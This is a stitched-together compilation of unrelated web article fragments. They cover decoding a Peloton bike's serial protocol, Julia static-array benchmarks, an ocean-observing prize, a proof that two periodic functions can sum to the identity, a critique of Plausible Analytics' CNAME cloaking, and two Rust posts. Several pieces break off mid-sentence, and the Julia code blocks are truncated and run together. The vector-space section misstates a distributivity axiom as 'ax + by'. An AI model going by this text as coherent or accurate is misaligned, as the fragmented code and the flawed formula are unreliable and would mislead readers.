<p>Let’s get down to&nbsp;it.</p>

<h2 id="mapping-the-available-signals"><a href="#mapping-the-available-signals">Mapping the available&nbsp;signals</a></h2>
<p>There are only two cables that plug into the tablet: a barrel jack carrying
<span>DC</span> power @ 12V (coming from the power brick), and a <span>TRRS</span> connector —
think “stereo aux cable”. So the data is clearly coming in on the latter.
Since I only wanted to observe the traffic between the <span>HU</span> and the bike,
not interrupt it, I used a headphone splitter cable to split the cable from the bike with an extra jack, and connected an aux cable from that extra jack
to the breakout. Such a connection might disrupt some high-speed communications
protocols, but my guess was that a) there wasn’t going to be that much traffic
to require anything fancy, b) nothing fast would be running over 3.5mm <span>TRRS</span>, and
c) this interface would be engineered with pretty wide tolerances for stability 
in a home environment. (Spoiler alert: all of these were&nbsp;true.)</p>
<p>The first step was to identify the pinout from the jack as best
as possible. Probing the leads with a <span>DMM</span> with the bike active showed that
Ring2 was at ground (0V with respect to the power supply’s ground)
with -5.5-6V between tip or ring1 and ground. Sleeve also appears to be
at ground, but it and Ring2 may not quite be the same (more on this later).
The negative voltages with respect
to ground are a pretty strong sign that we’re going to see <span>RS</span>-232&nbsp;signaling.</p>
<h2 id="decoding-the-wire-protocol-with-a-logic-analyzer"><a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Decoding the wire protocol with a logic&nbsp;analyzer</a></h2>
<p>(If you’d like to load a PulseView trace to see the data for yourself, one session
file from a test ride is located in <code>peloton_decoding/resistance-stepped-10s.sr</code>
in <a href="https://github.com/ihaque/pelomon">the PeloMon GitHub repository</a>.)</p>
<p>Normally I’d wire up the breakout and hack something together on the Arduino
I have sitting around, but it turns out that logic analyzers have gotten
<em>really really cheap</em> so I splurged on a $12.50 one and thought I’d give it
a whirl — turned out to be a great idea that made it <span>WAY</span> easier to decode
the signals. With complete abandon regarding ground isolation and the voltage
tolerances of the <span>LA</span> (is it supposed to be able to handle negative voltage?),
I hooked it up to see what I’d get. These cheapo LAs emulate a Saleae Logic
analyzer and work fine in the open-source <a href="https://sigrok.org/wiki/PulseView">PulseView</a>&nbsp;software.</p>
<p><img alt="Hooking up the LA with D0 on tip, D4 on ring1, D5 on sleeve, and GND on ring2" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-4ring1-5sleeve-gndring2.png">
</p><center><strong>Hooking up the <span>LA</span> with D0 on tip, D4 on ring1, D5 on sleeve, and <span>GND</span> on ring2</strong></center>
<p><img alt="D0 on tip, D2 on ring1, D4 on ring2, and GND on sleeve" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-2ring1-4ring2-gndsleeve.png">
</p><center><strong>D0 on tip, D2 on ring1, D4 on ring2, and <span>GND</span> on sleeve</strong></center>
<p>There’s pretty clearly serial signaling going on over these wires! One
party seems to be sending requests on Tip every 100ms, and the other
party responds about a millisecond later on Ring1. While it wasn’t obvious
from the <span>DMM</span> whether signaling <span>GND</span> should be on Ring2 or Sleeve, from the <span>LA</span>
traces, it looks like there is less glitching on the response line if Ring2 is
used as <span>GND</span> - so we’ll do that. The narrow pulses are probably single bits,
so sampling at a high rate (a few hundred kHz) lets us measure the bit
rate as&nbsp;19200bps:</p>
<p><img alt="Counting samples in the LA shows a 19.2kHz signal" src="https://ihaque.org/static/img/2020/10/20201015-pinout-19200bps.png">
</p><center><strong>Counting samples in the <span>LA</span> shows a 19.2kHz signal</strong></center>
<p>PulseView also lets you add protocol decoders to particular wires. I put a <span>UART</span>
decoder on with D0 as “<span>RX</span>” and D4 as “<span>TX</span>”, and saw data, but with a ton of
low-level serial protocol errors. UARTs invert the signal going out on the wire
with the expectation that there will be another <span>UART</span> at the other end to
re-invert. Since we don’t have that second <span>UART</span>, we have to turn the “Invert <span>RX</span>”
and “Invert <span>TX</span>” options on in PulseView, and then we see clean data! I also
experimented with other serial options (data, parity, and stop bits), but the
first guess of 8N1 turned out&nbsp;correct.</p>
<p><img alt="Without inversion enabled, we see framing errors and break conditions" src="https://ihaque.org/static/img/2020/10/20201015-missing-inversion.png">
</p><center><strong>Without inversion enabled, we see framing errors and break conditions</strong></center>
<p><img alt="Turning on the inversion in software, we see data with no serial errors!" src="https://ihaque.org/static/img/2020/10/20201015-fixed-inversion.png">
</p><center><strong>Turning on the inversion in software, we see data with no serial errors!</strong></center>
<p>Following the data streams, we see that the data stream on the
Tip wire during a ride always consists of one of three different four-byte
packets, repeated round-robin every 100ms, with the responses on Ring1 to these
requests being longer, different in length depending on the request type, and
variable in content.
It seems likely then that the Tip shows us signaling from the head unit to the
bike, and Ring1 is the bike responding to the head unit with information
about variables like current speed, resistance, or power&nbsp;output.</p>
<p><strong>Thus, we’ve worked out the physical layer protocol for the Peloton
communications: <span>RS</span>-232 at 5.5V and 19200bps 8N1 encoding, with <span>HU</span>-to-bike
communications on Tip, bike-to-<span>HU</span> on Ring1, <span>GND</span> on Ring2, and something
ground-like on&nbsp;Sleeve.</strong></p>

<p>To investigate the encoding between the head unit and the bike, I used the
logic analyzer to capture a trace of the communications during a ride. (Shoutout
to Ben Alldis and his Ministry of Sound ride series!)
The data dump and scripts are available in the GitHub repository for this project
at https://github.com/ihaque/pelomon/, in the <code>peloton_decoding</code> subdirectory.)</p>
<h2 id="basic-packet-structure"><a href="#basic-packet-structure">Basic packet&nbsp;structure</a></h2>
<p>(To follow along, run <code>peloton_decoding/decoder_plots.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>During a ride, about every 100ms (100.66-100.8ms) the <span>HU</span> sends a request
to the bike, and the bike responds about 300us (i.e., 0.3ms) from the end
of the <span>HU</span>’s request. The <span>HU</span> sends three different request packets round robin.
Each request type has a different response length from the&nbsp;bike:</p>
<table> 
<tbody><tr><th><span>HU</span> Request</th><th>Bike Response Length</th><th>Example Bike Response</th></tr>
<tr><td><tt>F5 41 36 F6</tt></td><td>8 bytes</td><td><tt>F1 41 03 30 30 30 C5 F6</tt></td></tr>
<tr><td><tt>F5 44 39 F6</tt></td><td>10 bytes</td><td><tt>F1 44 05 30 30 30 30 30 2A F6</tt></td></tr>
<tr><td><tt>F5 4A 3F F6</tt></td><td>9 bytes</td><td><tt>F1 4A 04 38 36 36 30 13 F6</tt></td></tr>
</tbody></table>

<p>A few things are evident from simple inspection of the&nbsp;bytes:</p>
<ul>
<li>The first byte is a header - seems to be F5 from the <span>HU</span> and F1 from the&nbsp;bike.</li>
<li>All packets end in&nbsp;F6.</li>
<li>The second byte that the <span>HU</span> sends seems to be a request type, and is mirrored in the second byte in the bike’s&nbsp;response.</li>
<li>The third byte of the bike response is the length of the full packet minus 5 — probably indicates the length of the data payload following&nbsp;it.</li>
<li>Serial packets often carry a checksum, and here the second-to-last byte from either the <span>HU</span> or the bike seems to be that: it’s the sum (modulo 256) of all the bytes preceding&nbsp;it.</li>
</ul>
<p>Thus, the packet format seems to&nbsp;be:</p>
<ul>
<li><span>HU</span>: <code>F5 [request type] [checksum] F6</code></li>
<li>Bike: <code>F1 [request type] [payload length] [response bytes 1-n] [checksum] F6</code></li>
</ul>
<p>We can now throw together a quick plot of each response byte to look for&nbsp;patterns.</p>
<p><img alt="Bytewise plot of Peloton response data for common request packets during part of a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-bytewise.png">
</p><center><strong>Bytewise plot of Peloton response data for common request packets during part of a ride</strong></center>
<p>It appears that every byte ranges from 0x30 to 0x39 — which is exactly the
<span>ASCII</span> range for decimal digits 0 through 9. Furthermore, the earlier bytes in
each packet appear to vary more quickly than the later ones through a ride,
suggesting that the least-significant digit comes first. <strong>The Peloton bike
is encoding its responses as little-endian <span>ASCII</span> digits.</strong> It’s easy enough
to dump a plot of these values per response type now that we know the&nbsp;encoding:</p>
<p><img alt="Decoded values sent by bike to head unit during a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-ascii.png">

<p>(To follow along, run <code>peloton_decoding/decode_resistance.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>Glancing at these graphs it’s pretty clear that we have ride data of the Peloton
trifecta — cadence, power, and resistance — with a couple weird things thrown in
for flavor. Comparing to the Peloton ride stats, <strong>request type 0x41 seems to directly
return cadence in rpm and request type 0x44 returns 10 times power in watts (i.e.,</strong></p></div></div>

There, we gave the Julia compiler knowledge of the dimension of the matrices at the time it generates code, instead of passing that dimension as a runtime variable, and saw significant runtime speedups as a consequence. This time, let’s push this further by giving the compiler a whole vector of numbers instead of a single integer.</p><p>Let’s say we are given a vector <code>v</code> of length <code>d</code> and wish to permute it according to some permutation <code>p</code>.</p><pre><code>julia&gt; d = 10

We can encode the permutation in the type domain and compile a specialized function to do this much faster. To make such a <a href="https://docs.julialang.org/en/v1/base/base/#Base.Val">value type</a>, our permutation must have <code>isbits(p) == true</code>.</p><pre><code>julia&gt; isbits(p)
false</code></pre><p>To remedy this, we could convert <code>p</code> to a tuple which has a static length, unlike a vector (which it currently is). However, then we won’t be able to do the indexing trick of <code>v[p]</code> to permute the entries of the vector. Instead, we’ll convert it to a <code>SVector</code> or static vector from <code>StaticArrays.jl</code>. This supports indexing like vectors, but is backed by a tuple of fixed length.</p><pre><code>julia&gt; using StaticArrays

In the dynamic version, which uses the <strong>same</strong> code for any (<code>Float64</code>) vector of any length, and any permutation, the code is a fair bit longer and more complicated. In fact, all of the code shown above is simply to deal with things like throwing out of bounds errors in case the vector <code>v</code> does not have entries at the indicies <code>p</code> asks for. Then at the end, we see a call to <code>Base._unsafe_getindex</code> which actually does the indexing once all the error-checking is done.</p><p>So could this huge performance advantage in the static case be partly to the fact that we don’t need to check that the indexing operation is valid, since we know the lengths of both <code>v</code> and <code>p</code> at compile time in that case? We can check by benchmarking:</p><pre><code>julia&gt; @btime Base._unsafe_getindex($(IndexLinear()), $v, $p)

                  The Powering the Blue Economy™: Ocean Observing Prize challenges innovators to integrate marine renewable energy with ocean observation platforms, ultimately revolutionizing our ability to collect the data needed to understand, map, and monitor the ocean.

                  This joint prize between the Water Power Technologies Office (WPTO) at the U.S. Department of Energy and the Integrated Ocean Observing System (IOOS®) Office at the National Oceanic and Atmospheric Administration (NOAA) seeks to develop new technologies that can help fill the data gaps making it difficult to realize the full potential of the Blue Economy. The Ocean Observing Prize includes a series of competitions with millions of dollars in awards to encourage rapid innovation in the fields of marine energy and ocean observations, that began with the DISCOVER Competition and is followed by the DEVELOP Competition. The Pacific Northwest National Laboratory and the National Renewable Energy Laboratory are supporting DOE and NOAA on the development and administration of the prize.

                The Ocean Observing Prize is a series of competitions with cash awards to incentivize accelerated advancement of ideas from concept to demonstration. The first competition, the DISCOVER Competition, closed on February 12, 2020. Competitors submitted novel concepts that integrate ocean observing technologies with marine energy systems to address end-user needs across five broad themes: (1) Unmanned Vehicles; (2) Communications and Underwater Navigation; (3) Extreme Environments; (4) Buoys, Floats, and Tags; and (5) Blue Sea Ideas (i.e. other). Following the DISCOVER Competition, the DEVELOP Competition focuses on a single theme, <a href="https://americanmadechallenges.org/oceanobserving/develop.html">hurricane monitoring</a>, and challenges contestants to develop their ideas into a functioning prototype through three contests: DESIGN, BUILD, and SPLASH. Together, the DISCOVER and DEVELOP Competitions will award up to $3 million in cash prizes as well as other in-kind awards.
              </p>
              <p>
                The Ocean Observing Prize is repeatable, and it is expected that future iterations may focus on other themes. Through this competition, innovators will be able to tap into DOE and NOAA’s network of National Laboratories, energy incubators and accelerators, subject matter experts, and other resources across the nation to build novel technologies that collect critical ocean data.

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and all \( x
      \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and all \(
      x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
In the above expansion of \( x, \) we use the notation \( x_a \) to
denote the rational number that appears as the coefficient of the basis
vector \( a. \) Therefore \( (x + y)_{a} = x_a + y_a \) for all \( x, y
\in \mathbb{R} \) and all \( a \in \mathcal{H}. \)
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors. Thus \( (x + b)_{a} = x_a
+ b_a = x_a + 0 = x_a \) for all \( x \in \mathbb{R} \) and distinct \(
a, b \in \mathcal{H}. \) This shows that a function \( f(x) = x_a \) is
a periodic function with period \( b \) for any \( a \in \mathcal{H} \)
and any \( b \in \mathcal{H} \setminus \{ a \}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  g(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  h(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Now \( g(x) \)
is a periodic function with period \( b \) for any \( b \in \mathcal{H}
\) and \( h(x) \) is a periodic function with period \( c \) for any \(
c \in \mathcal{H} \setminus \{ b \}. \) Further,
\[
  g(x) + h(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( g(x) \) and \( h(x) \) are two periodic functions such that
their sum is the identity function.
</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>

<p>In this podcast episode of Security Headlines: Carl Lerche, Rust developer and<br>
maintainer of the popular Rust programming library Tokio joins us.<br>
He walks us through what Rust and Tokio is, how companies are building their stacks with Rust.<br>
This and a lot more on this episode of Security Headlines!</p>

<p>Carl heard about this new programming language called Rust and wanted to check it out.
What started as a hobby project led Carl down the rust path and he now works for Amazon as a<br>
Rust developer! Helping Amazon build stable infrastructure.</p>

<p>We get to hear the story of how Tokio got started and how the Rust programming language has changed<br>
over the years.<br>
Since a large chunk of Tokio code is focusing on making it easy for developers to write asynchronous functions.<br>
And be able to write fast code that does not get stuck and lets the data flow.<br>
But how does non-blocking code really work? What differs Rust from the programming language Golang is<br>
Golangs, adoption of green threads instead of using regular threads.<br>
Carl walks us through how this works and how Rust tackles this problem “the Rust way”.</p>

<p>Do you want to build reliable network services with Rust?<br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-10b1bd0a="" data-v-2ae295f5=""><p><em>Herein I share an experienced developer's first foray into a real-world Rust project. It focuses closely on the type system, and the key insights I needed to begin "thinking in Rust". Written for those getting to grips with the language, it will be especially useful if your background isn't functional programming.</em> </p>
<p><em>Although originally conceived as part 2 of 2, this can be read as a standalone entry. In <a href="https://thefuntastic.com/blog/rust-tide-clock">part 1</a>, written for a general audience, I detail the maker project, a Raspberry Pi Tide Clock, and the heartwarming story behind its origins.</em></p>
<p><img src="https://thefuntastic.com/blog/2020-09-Tide-Clock-1.jpg" title="Picture of the completed Tide Clock"></p>
<h2 id="my-first-date-with-rust---know-thy-enemy">My First Date with Rust - Know Thy Enemy</h2>
<p>As a working programmer with several mainstream languages under your belt (eg <code>Java</code>, <code>C#</code>, <code>javascript</code>, <code>python</code>, etc) it's reasonable to expect that after a bit of orientation with quirks and syntax you'll find yourself somewhat productive. If you know Rust you won't be surprised when I say my experience was... humbling. </p>
<p>The last time I felt so dumb was probably more than a decade ago, as a novice programmer teaching myself Object Orientated Programming (OOP). I think that's the point, new paradigms require effort to build a working mental model for. And depending on where you start on the ladder you might have quite a lot of mental rebuilding to do.  </p>
<p>Rust intentionally tries to be "boring". That is to say, its DNA borrows liberally from prior art. If you're familiar with manual memory management (<code>C</code>, <code>C++</code>, <code>Obj-C</code>) you'll probably understand pointers in Rust. If you're familiar with functional languages (<code>Haskell</code>, <code>Elm</code>, <code>Clojure</code>, <code>OCaml</code>) you'll have an immediate start recognising the type system. The reason it aims for boring is because it spends its entire novelty budget on the one unique idea: automatic scope based memory allocation (aka the borrow checker). This is the knockout feature: <strong>the performance of C with the safety of garbage collected languages.</strong></p>
<p><a href="http://intorust.com/" target="_blank" rel="nofollow noopener noreferrer">Plenty</a> <a href="https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html" target="_blank" rel="nofollow noopener noreferrer">of ink</a> <a href="https://squidarth.com/rc/rust/2018/05/31/rust-borrowing-and-ownership.html" target="_blank" rel="nofollow noopener noreferrer">has been</a> <a href="https://dev.to/strottos/learn-rust-the-hard-bits-3d26" target="_blank" rel="nofollow noopener noreferrer">written</a> about ownership and the borrow checker. It follows the most unprecedented feature would have the most said about it. There seems to be a common refrain: "<em>It's really hard at first, but stick with it. You'll see, it changes everything</em>". Sounds suspiciously like Vim or Emacs users (please don't fight me). Is it the promised land or just a severe case of Stockholm syndrome?     </p>
<p>Nevertheless, extensive reading had prepared me to expect a big ol' messy fight with the borrow checker. We did tussle, but it went better than expected. Ironically, after years of <code>C#</code> game development, performance concerns have taught me much of the internal dialogue needed to reason about memory lifetimes: "Is this allocated on the stack or heap? Is this going to create allocation (garbage collection) pressure? Is this copying data or mutating it in place?"</p>
<p>In this sense, when the borrow checker complained I could at least appreciate what it was trying to protect me against. And as to be expected, it may be a while yet before I fully grok lifetimes. Controversially though, "Rust's expressive type system" put up a stiffer fight than I anticipated.</p>
<h2 id="stubbing-toes-on-functional-programming">Stubbing Toes on Functional Programming</h2>
<p>Before anyone grabs a pitchfork, this isn't a rant about the unnecessary burden of type systems. Throughout my career, I've favoured statically and strongly typed programming languages. I believe in correctness, and tooling should help you get there. It's why Rust excites me.</p>
<p>Taken to its ultimate conclusion, one arrives at <code>Haskell</code> and other pure functional programming (FP) languages. FP's conceit is trading performance for correctness. As a concerned game developer, this never felt like a bargain I could entertain. Not that it's prevented FP idioms from seeping into the groundwater of other programming languages (see <code>LINQ</code> in <code>C#</code> or <code>map() filter() reduce()</code> in <code>javascript</code> as examples).   </p>
<p>You can see signs of this functional DNA written all over Rust too, immutability by default being the most obvious. However, Rust strikes a wonderfully pragmatic balance. Imperative programming is not outlawed, and many escape hatches exist. Rust is, as far as I'm aware, <strong>the first language that allows you to deploy functional concepts as zero-cost abstractions</strong>. If the borrow checker is the obvious hit single, this is the real album sleeper hit. </p>
<p>I think my undoing was simply that I had a false expectation of equivalence. I'm confident in my type literacy and I can, if we must, talk in-depth about Java design patterns. I've never courted a "proper" functional language, but I recognise their influence. I understood "expressive type system" to be a superset of what I already know. In some respects it is, but in others, it was fundamentally different. I want to share some of my "aha" moments because I haven't seen much written with this lens...  </p>
<h2 id="use-rust-analyzer">Use Rust Analyzer!</h2>
<p>To anyone following my footsteps: <strong>setup your dev environment for code intelligence and type hints</strong> is my best advice. I intentionally offer it here before any code samples make you glaze over and miss it.  </p>
<p><img src="https://thefuntastic.com/blog/2020-10-Rust-Analyser.png" title="Screenshot of Rust Analyser extension in Visual Studio extensions gallery"></p>
